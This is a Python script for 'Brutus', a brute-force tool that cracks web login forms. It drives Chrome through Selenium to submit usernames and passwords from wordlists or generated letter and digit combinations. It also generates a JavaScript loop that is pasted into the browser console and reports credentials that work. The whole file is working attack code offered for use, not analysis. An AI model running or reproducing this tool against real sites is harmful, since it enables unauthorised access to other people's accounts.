import selenium
from selenium.common.exceptions import NoSuchElementException
from selenium import webdriver
import argparse
import time as t
import os

os.system('cls' if os.name == 'nt' else 'clear')

print('''\u001b[31m\u001b[1m
               _______                     __
              |   __  |                   |  |
              |  |__| |                 __|  |__
              |       |______ ___    __|_     __|__    ___  ______
              |   __  |   ___|   |  |   | |  | |   |  |   ||  ____|
              |  |__| |  |   |   |__|   | |  | |   |__|   ||_____ |
              |_______|__|   |__________| |__| |__________||______|''')
     
print('''\u001b[31m\u001b[1mCREATED BY JOE NOORCHASHM
\u001b[0m''')
print()

#1, 1a
final_listU = []
final_listP = []
list2U = []
mylist = []
fU = ""
linesU = []
linesUF = []
fP = ""
linesP = []
linesPF = []
combo = ""
user = ""
passwor = ""
driver = ""
username = ""
password = ""
userfw = ""
passwordfw = ""
pholder2d2d = ""
uholder2d2d = ""
pholder1d2d = ""
uholder1d2d = ""

#1, 2a
file = ""
final_listU_str = ""
final_listP_str = ""
linesUF_str = ""
linesPF_str = ""

def Permutations(symbols, holder, n, r):
    if r == 0:
        mylist.append(holder)
        return
        
    for x in range(n):
        user = holder + symbols[x]
        Permutations(symbols, user, n, r-1)

def oneDoneD_1a(user_s, pass_s, button_s, us, pa): #P, U
    driver.get(url)
    while True:
        try:
            driver.find_element_by_css_selector(user_s).send_keys(us)
            driver.find_element_by_css_selector(pass_s).send_keys(pa)
            
            driver.find_element_by_css_selector(button_s).click()
            
            driver.find_element_by_css_selector(user_s).clear()
            driver.find_element_by_css_selector(pass_s).clear()
            
            print ("\u001b[31mUsername sent: " + us + " --------- Password sent: " + pa+"\u001b[0m")
            print()
        except selenium.common.exceptions.NoSuchElementException:
            os.system('cls' if os.name == 'nt' else 'clear')
            print ("\u001b[32m\u001b[1mUSERNAME AND PASSWORD FOUND: " + us + " /// " + pa+"\u001b[0m")
            t.sleep(10)
            exit()

def oneDtwoDU_1a(user_s, pass_s, button_s, us, pa): #P, UL - P, RU - PL, U - RP, U
    driver.get(url)
    while True:
        try:
            for x in us:
                uholder1d2d = x
                driver.find_element_by_css_selector(user_s).send_keys(x)
                driver.find_element_by_css_selector(pass_s).send_keys(pa)
                
                driver.find_element_by_css_selector(button_s).click()
                
                driver.find_element_by_css_selector(user_s).clear()
                driver.find_element_by_css_selector(pass_s).clear()
                
                t.sleep(1)
                
                print ("\u001b[31mUsername sent: " + x + " --------- Password sent: " + pa+"\u001b[0m")
                print()
        except selenium.common.exceptions.NoSuchElementException:
            os.system('cls' if os.name == 'nt' else 'clear')
            print ("\u001b[32m\u001b[1mUSERNAME AND PASSWORD FOUND: " + uholder1d2d + " /// " + pa+"\u001b[0m")
            t.sleep(10)
            exit()

def oneDtwoDP_1a(user_s, pass_s, button_s, us, pa): #PL, U - RP, U
    driver.get(url)
    while True:
        try:
            for x in pa:
                pholder1d2d = x
                driver.find_element_by_css_selector(user_s).send_keys(us)
                driver.find_element_by_css_selector(pass_s).send_keys(x)
                
                driver.find_element_by_css_selector(button_s).click()
                
                driver.find_element_by_css_selector(user_s).clear()
                driver.find_element_by_css_selector(pass_s).clear()
                
                print ("\u001b[31mUsername sent: " + us + " --------- Password sent: " + x+"\u001b[0m")
                t.sleep(10)
                print()
        except selenium.common.exceptions.NoSuchElementException:
            os.system('cls' if os.name == 'nt' else 'clear')
            print ("\u001b[32m\u001b[1mUSERNAME AND PASSWORD FOUND: " + us + " /// " + pholder1d2d+"\u001b[0m")
            t.sleep(10)
            exit()


def twoDtwoD_1a(user_s, pass_s, button_s, us, pa): #PL, UL - PL, RU - RP, UL - RP, RU
    driver.get(url)
    while True:
        try:
            for x in pa:
                for y in us:
                    pholder2d2d = x
                    uholder2d2d = y
                    driver.find_element_by_css_selector(user_s).send_keys(y)
                    driver.find_element_by_css_selector(pass_s).send_keys(x)
                    
                    driver.find_element_by_css_selector(button_s).click()
                    
                    driver.find_element_by_css_selector(user_s).clear()
                    driver.find_element_by_css_selector(pass_s).clear()
                    
                    print ("\u001b[31mUsername sent: " + y + " --------- Password sent: " + x+"\u001b[0m")
                    print()
        except selenium.common.exceptions.NoSuchElementException:
            os.system('cls' if os.name == 'nt' else 'clear')
            print ("\u001b[32m\u001b[1mUSERNAME AND PASSWORD FOUND: " + uholder2d2d + " ---------- " + pholder2d2d+"\u001b[0m")
            t.sleep(10)
            exit()

def oneDoneD_1b(usernameID_x, passwordID_x, buttonID_x, txtFile_x, startID_x, startHTML, us, pa):
    code = ('function bruteForce(){var name = "'+us+'"; var pass = "'+pa+'";  var entry=false; while(!entry){  document.getElementById("'+usernameID_x+'").value = name; document.getElementById("'+passwordID_x+'").value = pass; document.getElementById("'+buttonID_x+'").click();if((document.getElementById("'+startID_x+'").innerHTML == "'+startHTML+'")){ console.log("Username tried:"+name+" --- Password tried:"+pass+"")} else{throw new Error("USERNAME AND PASSWORD FOUND: "+name+" ------ "+pass)}}entry=true} bruteForce();')
    f = open(txtFile_x, "w+")
    f.write(code)

def oneDtwoDU_1b(usernameID_x, passwordID_x, buttonID_x, txtFile_x, startID_x, startHTML, us, pa):
    code = ('function bruteForce(){var name = "'+us+'"; var names = name.split(" "); var pass = "'+pa+'"; var entry=false; while(!entry){ for (var i = 0; i < names.length; i++){  document.getElementById("'+usernameID_x+'").value = names[i]; document.getElementById("'+passwordID_x+'").value = pass; document.getElementById("'+buttonID_x+'").click();if((document.getElementById("'+startID_x+'").innerHTML == "'+startHTML+'")){ console.log("Username tried:"+names[i]+" --- Password tried:"+pass+"")} else{throw new Error("USERNAME AND PASSWORD FOUND: "+names[i]+" ------ "+pass)} }entry=true}} bruteForce();')
    f = open(txtFile_x, "w+")
    f.write(code)

def oneDtwoDP_1b(usernameID_x, passwordID_x, buttonID_x, txtFile_x, startID_x, startHTML, us, pa):
    code = ('function bruteForce(){var name = "'+us+'"; var pass = "'+pa+'"; var passes = pass.split(" "); var entry=false; while(!entry){ for (var i = 0; i < passes.length; i++){ document.getElementById("'+usernameID_x+'").value = name; document.getElementById("'+passwordID_x+'").value = passes[i]; document.getElementById("'+buttonID_x+'").click();if((document.getElementById("'+startID_x+'").innerHTML == "'+startHTML+'")){ console.log("Username tried:"+name+" --- Password tried:"+passes[i]+"")} else{throw new Error("USERNAME AND PASSWORD FOUND: "+name+" ------ "+passes[i])} }entry=true}} bruteForce();')
    f = open(txtFile_x, "w+")
    f.write(code)

def twoDtwoD_1b(usernameID_x, passwordID_x, buttonID_x, txtFile_x, startID_x, startHTML, us, pa):
    code = ('function bruteForce(){var name = "'+us+'"; var names = name.split(" "); var pass = "'+pa+'"; var passes = pass.split(" "); var entry=false; while(!entry){ for (var i = 0; i < passes.length; i++){ for (var k = 0; k < names.length; k++){ document.getElementById("'+usernameID_x+'").value = names[k]; document.getElementById("'+passwordID_x+'").value = passes[i]; document.getElementById("'+buttonID_x+'").click(); if((document.getElementById("'+startID_x+'").innerHTML == "'+startHTML+'")){ console.log("Username tried:"+names[k]+" --- Password tried:"+passes[i]+"")} else{throw new Error("USERNAME AND PASSWORD FOUND: "+names[k]+" ------ "+passes[i])}} }entry=true}} bruteForce();')
    f = open(txtFile_x, "w+")
    f.write(code)

print("WHAT PROGRAM DO YOU WANT TO USE?")
choice1 = input('''
    \u001b[31m[1] MAIN
    
    \u001b[0m''')

if choice1 == "1":
    os.system('cls' if os.name == 'nt' else 'clear')
    print("\u001b[33m\u001b[1mTHIS PROGRAM IS CAP SENSITIVE\u001b[0m")
    print()
    print("WHAT LANGUAGE WOULD YOU LIKE TO USE?")
    choice1a = input('''
        \u001b[31m[1a] PYTHON         (~10 guesses/sec)
        [1b] JAVASCRIPT     (~30000 guesses/sec)\u001b[0m
        
        ''')
    if choice1a == "1a":
        os.system('cls' if os.name == 'nt' else 'clear')
        chromedriver = input("""Enter the path of your chromedriver:

""").strip()
        
        os.system('cls' if os.name == 'nt' else 'clear')
        url = input("""Enter the url of the website (Ex: https://example.com/this/example):

""")
        
        os.system('cls' if os.name == 'nt' else 'clear')
        usersel = input("""Enter the username selector:

""")
        
        os.system('cls' if os.name == 'nt' else 'clear')
        passsel = input("""Enter the password selector:

""")
        
        os.system('cls' if os.name == 'nt' else 'clear')
        buttonsel = input("""Enter the button selector:

""")
    
        os.system('cls' if os.name == 'nt' else 'clear')
        userchoice = input("""            [U] - Single Username
            [UL] - List of Usernames from a .txt file
            [RU] - Pattern of the same kind as your username to generate all possible combinations:
            
            """)
        
        os.system('cls' if os.name == 'nt' else 'clear')
        passchoice = input("""            [P] - Single Password
            [PL] - List of Passwords From a .txt File
            [RP] - Pattern of the Same Kind as Your Password to Generate All Possible Combinations:
            
            """)

        if url == False:
            print("\u001b[31m\u001b[1mERROR! NO URL FOUND!\u001b[0m")

        if chromedriver == False:
            print("\u001b[31m\u001b[1mERROR! NO CHROMEDRIVER FOUND!\u001b[0m")

        if userchoice == "U":
            os.system('cls' if os.name == 'nt' else 'clear')
            username = input("""ENTER THE USERNAME TO USE
                
                """)
        elif userchoice == "UL":
            os.system('cls' if os.name == 'nt' else 'clear')
            username = input("""ENTER THE PATH TO YOUR USERNAME LIST
            
""").strip()
            fU = open(username, "r")
            linesU = fU.readlines()
            for x in linesU:
                linesUF.append(x)
        elif userchoice == "RU":
            os.system('cls' if os.name == 'nt' else 'clear')
            username = input("""ENTER THE PATTERN FOR YOUR USERNAME (IF YOUR USERNAME IS 'PETER212', THEN INPUT: 'LLLLLNNN' (5 CHARACTER MAXIMUM)
                
""")
            print()
            print("\u001b[31m\u001b[1mPlease Wait! This may take a few minutes.\u001b[0m")
            if len(username) < 6:
                Permutations("abcdefghijklmnopqrstuvwxyz1234567890", "", 36, len(username))
                
                passwor = username
                
                for x in mylist:
                    list2 = [ch for ch in x]
                    for y in list2:
                        if y.isalpha() == True:
                            combo = combo + "L"
                            if len(combo) == len(passwor):
                                if combo == passwor:
                                    final_listU.append(x)
                                    combo = ""
                                else:
                                    combo = ""
                        if y.isdigit() == True:
                            combo = combo + "N"
                            if len(combo) == len(passwor):
                                if combo == passwor:
                                    final_listU.append(x)
                                    combo = ""
                                else:
                                    combo = ""
                    list2.clear()
                mylist.clear()
            else:
                print ("\u001b[31m\u001b[1mERROR! THE LENGTH OF THE USERNAME IS TO LONG!\u001b[0m")
        else:
            print("\u001b[31m\u001b[1mERROR! NO USERNAME FOUND!\u001b[0m")
        if passchoice == "P":
            os.system('cls' if os.name == 'nt' else 'clear')
            password = input("""ENTER THE PASSWORD TO USE
            
            """)
        elif passchoice == "PL":
            os.system('cls' if os.name == 'nt' else 'clear')
            password = input("""ENTER THE PATH TO YOUR PASSWORD LIST
                
""").strip()
            fP = open(password, "r")
            linesP = fP.readlines()
            for x in linesP:
                linesPF.append(x)
        elif passchoice == "RP":
            os.system('cls' if os.name == 'nt' else 'clear')
            password = input("""ENTER THE PATTERN FOR YOUR PASSWORD (IF YOUR PASSWORD IS 'PETER212', THEN INPUT: 'LLLLLNNN' (5 CHARACTER MAXIMUM)
                
""")
            print()
            print("\u001b[31m\u001b[1mPlease Wait! This may take a few minutes.\u001b[0m")
            if len(password) < 6:
                Permutations("abcdefghijklmnopqrstuvwxyz1234567890", "", 36, len(password))
                
                passwor = password
                
                for x in mylist:
                    list2 = [ch for ch in x]
                    for y in list2:
                        if y.isalpha() == True:
                            combo = combo + "L"
                            if len(combo) == len(passwor):
                                if combo == passwor:
                                    final_listP.append(x)
                                    combo = ""
                                else:
                                    combo = ""
                        if y.isdigit() == True:
                            combo = combo + "N"
                            if len(combo) == len(passwor):
                                if combo == passwor:
                                    final_listP.append(x)
                                    combo = ""
                                else:
                                    combo = ""
                    list2.clear()
                mylist.clear()
            else:
                print ("\u001b[31m\u001b[1mERROR! THE LENGTH OF THE PASSWORD IS TO LONG!\u001b[0m")
        else:
            print("\u001b[31m\u001b[1mERROR! NO PASSWORD FOUND!\u001b[0m")

        driver = webdriver.Chrome(chromedriver)

        if userchoice == "U" and passchoice == "P":
            oneDoneD_1a(usersel, passsel, buttonsel, username, password)
        elif userchoice == "U" and passchoice == "PL":
            oneDtwoDP_1a(usersel, passsel, buttonsel, username, linesPF)
        elif userchoice == "U" and passchoice == "RP":
            oneDtwoDP_1a(usersel, passsel, buttonsel, username, final_listP)
        elif userchoice == "UL" and passchoice == "P":
            oneDtwoDU_1a(usersel, passsel, buttonsel, linesUF, password)
        elif userchoice == "UL" and passchoice == "PL":
            twoDtwoD_1a(usersel, passsel, buttonsel, linesUF, linesPF)
        elif userchoice == "UL" and passchoice == "RP":
            twoDtwoD_1a(usersel, passsel, buttonsel, linesUF, final_listP)
        elif userchoice == "RU" and passchoice == "P":
            oneDtwoDU_1a(usersel, passsel, buttonsel, final_listU, password)
        elif userchoice == "RU" and passchoice == "PL":
            twoDtwoD_1a(usersel, passsel, buttonsel, final_listU, linesPF)
        elif userchoice == "RU" and passchoice == "RP":
            twoDtwoD_1a(usersel, passsel, buttonsel, final_listU, final_listP)
        else:
            print("\u001b[31m\u001b[1mERROR! INVALID SELECTIONS!\u001b[0m")

    if choice1a == "1b":
        os.system('cls' if os.name == 'nt' else 'clear')
        usernameID = input("""Enter the id of the username:
            
""")
        if usernameID == False:
            print("ERROR! NO USERNAME id FOUND!")
        os.system('cls' if os.name == 'nt' else 'clear')
        passwordID = input("""Enter the id of the password:
            
""")
        if passwordID == False:
            print("\u001b[31m\u001b[1mERROR! NO PASSWORD id FOUND!\u001b[0m")
        os.system('cls' if os.name == 'nt' else 'clear')
        buttonID = input("""Enter the id of the button:
            
""")
        if buttonID == False:
            print("\u001b[31m\u001b[1mERROR! NO BUTTON id FOUND!\u001b[0m")
        os.system('cls' if os.name == 'nt' else 'clear')
        txtFile = input("""Enter the path to a empty .txt file to put the code in:
            
""").strip()
        if txtFile == False:
            print("\u001b[31m\u001b[1mERROR! NO .txt FILE FOUND!\u001b[0m")
        else:
            file = open(txtFile, "w+")
        os.system('cls' if os.name == 'nt' else 'clear')
        startID = input("""Enter the id of the something on the login page (if login is correct, this thing should no longer be there):
            
""")
        if startID == False:
            print("\u001b[31m\u001b[1mERROR! NO STARTING POINT id FOUND!\u001b[0m")
        os.system('cls' if os.name == 'nt' else 'clear')
        startHTML = input("""Enter the plain HTML text of the starting point id:
            
""")
        if startHTML == False:
            print("\u001b[31m\u001b[1mERROR! NO STARTING POINT HTML PLAIN TEXT FOUND!\u001b[0m")
        os.system('cls' if os.name == 'nt' else 'clear')
        userchoice = input("""            [U] - Single Username
            [UL] - List of Usernames from a .txt file
            [RU] - Pattern of the same kind as your username to generate all possible combinations:
    
    """)
        os.system('cls' if os.name == 'nt' else 'clear')
        passchoice = input("""            [P] - Single Password
            [PL] - List of Passwords From a .txt File
            [RP] - Pattern of the Same Kind as Your Password to Generate All Possible Combinations:
    
    """)
        if userchoice == "U":
            os.system('cls' if os.name == 'nt' else 'clear')
            username = input("""ENTER THE USERNAME TO USE
                
            """)
        elif userchoice == "UL":
            os.system('cls' if os.name == 'nt' else 'clear')
            username = input("""ENTER THE PATH TO YOUR USERNAME LIST
                
            """).strip()
            fU = open(username, "r")
            linesU = fU.readlines()
            for x in linesU:
                linesUF.append(x)
            for x in linesUF:
                linesUF_str = x.strip()+" "+linesUF_str
        elif userchoice == "RU":
            os.system('cls' if os.name == 'nt' else 'clear')
            username = input("""ENTER THE PATTERN FOR YOUR USERNAME (IF YOUR USERNAME IS 'PETER212', THEN INPUT: 'LLLLLNNN' (5 CHARACTER MAXIMUM)
                
""")
            print()
            print("\u001b[31m\u001b[1mPlease Wait! This may take a few minutes.\u001b[0m")
            if len(username) < 6:
                Permutations("abcdefghijklmnopqrstuvwxyz1234567890", "", 36, len(username))
                
                passwor = username
                
                for x in mylist:
                    list2 = [ch for ch in x]
                    for y in list2:
                        if y.isalpha() == True:
                            combo = combo + "L"
                            if len(combo) == len(passwor):
                                if combo == passwor:
                                    final_listU.append(x)
                                    combo = ""
                                else:
                                    combo = ""
                        if y.isdigit() == True:
                            combo = combo + "N"
                            if len(combo) == len(passwor):
                                if combo == passwor:
                                    final_listU.append(x)
                                    combo = ""
                                else:
                                    combo = ""
                    list2.clear()
                mylist.clear()
                for x in final_listU:
                    final_listU_str = x.strip()+" "+final_listU_str
            else:
                print ("\u001b[31m\u001b[1mERROR! THE LENGTH OF THE USERNAME IS TO LONG!\u001b[0m")
        else:
            print("\u001b[31m\u001b[1mERROR! NO USERNAME FOUND!\u001b[0m")

        if passchoice == "P":
            os.system('cls' if os.name == 'nt' else 'clear')
            password = input("""ENTER THE PASSWORD TO USE
                
            """)
        elif passchoice == "PL":
            os.system('cls' if os.name == 'nt' else 'clear')
            password = input("""ENTER THE PATH TO YOUR PASSWORD LIST
                
""")
            fP = open(password, "r")
            linesP = fP.readlines()
            for x in linesP:
                linesPF.append(x)
            for x in linesPF:
                linesPF_str = x.strip()+" "+linesPF_str
        elif passchoice == "RP":
            os.system('cls' if os.name == 'nt' else 'clear')
            password = input("""ENTER THE PATTERN FOR YOUR PASSWORD (IF YOUR PASSWORD IS 'PETER212', THEN INPUT: 'LLLLLNNN' (5 CHARACTER MAXIMUM)
            
""")
            print()
            print("\u001b[31m\u001b[1mPlease Wait! This may take a few minutes.\u001b[0m")
            if len(password) < 6:
                Permutations("abcdefghijklmnopqrstuvwxyz1234567890", "", 36, len(password))
                
                passwor = password
                
                for x in mylist:
                    list2 = [ch for ch in x]
                    for y in list2:
                        if y.isalpha() == True:
                            combo = combo + "L"
                            if len(combo) == len(passwor):
                                if combo == passwor:
                                    final_listP.append(x)
                                    combo = ""
                                else:
                                    combo = ""
                        if y.isdigit() == True:
                            combo = combo + "N"
                            if len(combo) == len(passwor):
                                if combo == passwor:
                                    final_listP.append(x)
                                    combo = ""
                                else:
                                    combo = ""
                    list2.clear()
                mylist.clear()
                for x in final_listP:
                    final_listP_str = x.strip()+" "+final_listP_str
            else:
                print ("\u001b[31m\u001b[1mERROR! THE LENGTH OF THE PASSWORD IS TO LONG!\u001b[0m")
        else:
            print("\u001b[31m\u001b[1mERROR! NO PASSWORD FOUND!\u001b[0m")

        os.system('cls' if os.name == 'nt' else 'clear')
        print("\u001b[33m\u001b[1mThe code is being printed onto: "+txtFile+"\u001b[0m")
        t.sleep(3)
        print("")
        print("")
        if userchoice == "U" and passchoice == "P":
            oneDoneD_1b(usernameID, passwordID, buttonID, txtFile, startID, startHTML, username, password)
        elif userchoice == "U" and passchoice == "PL":
            oneDtwoDP_1b(usernameID, passwordID, buttonID, txtFile, startID, startHTML, username, linesPF_str)
        elif userchoice == "U" and passchoice == "RP":
            oneDtwoDP_1b(usernameID, passwordID, buttonID, txtFile, startID, startHTML, username, final_listP_str)
        elif userchoice == "UL" and passchoice == "P":
            oneDtwoDU_1b(usernameID, passwordID, buttonID, txtFile, startID, startHTML, linesUF_str, password)
        elif userchoice == "UL" and passchoice == "PL":
            twoDtwoD_1b(usernameID, passwordID, buttonID, txtFile, startID, startHTML, linesUF_str, linesPF_str)
        elif userchoice == "UL" and passchoice == "RP":
            twoDtwoD_1b(usernameID, passwordID, buttonID, txtFile, startID, startHTML, linesUF_str, final_listP_str)
        elif userchoice == "RU" and passchoice == "P":
            oneDtwoDU_1b(usernameID, passwordID, buttonID, txtFile, startID, startHTML, final_listU_str, password)
        elif userchoice == "RU" and passchoice == "PL":
            twoDtwoD_1b(usernameID, passwordID, buttonID, txtFile, startID, startHTML, final_listU_str, linesPF_str)
        elif userchoice == "RU" and passchoice == "RP":
            twoDtwoD_1b(usernameID, passwordID, buttonID, txtFile, startID, startHTML, final_listU_str, final_listP_str)
        else:
            print("\u001b[31m\u001b[1mERROR! INVALID SELECTIONS!")
        print("\u001b[32m\u001b[1mThe code has succesfully been written onto the .txt file!\u001b[0m")
        print()
        print()
        print("For MAC users with Chrome: copy all the code in your .txt file, open chrome, open developers tools, click on terminal, paste the code in, and then hit enter.")
        t.sleep(15)
        print()
        print()
        print("\u001b[31m\u001b[1mThe program will shut down in 5 seconds.\u001b[0m")
        t.sleep(5)
        
    

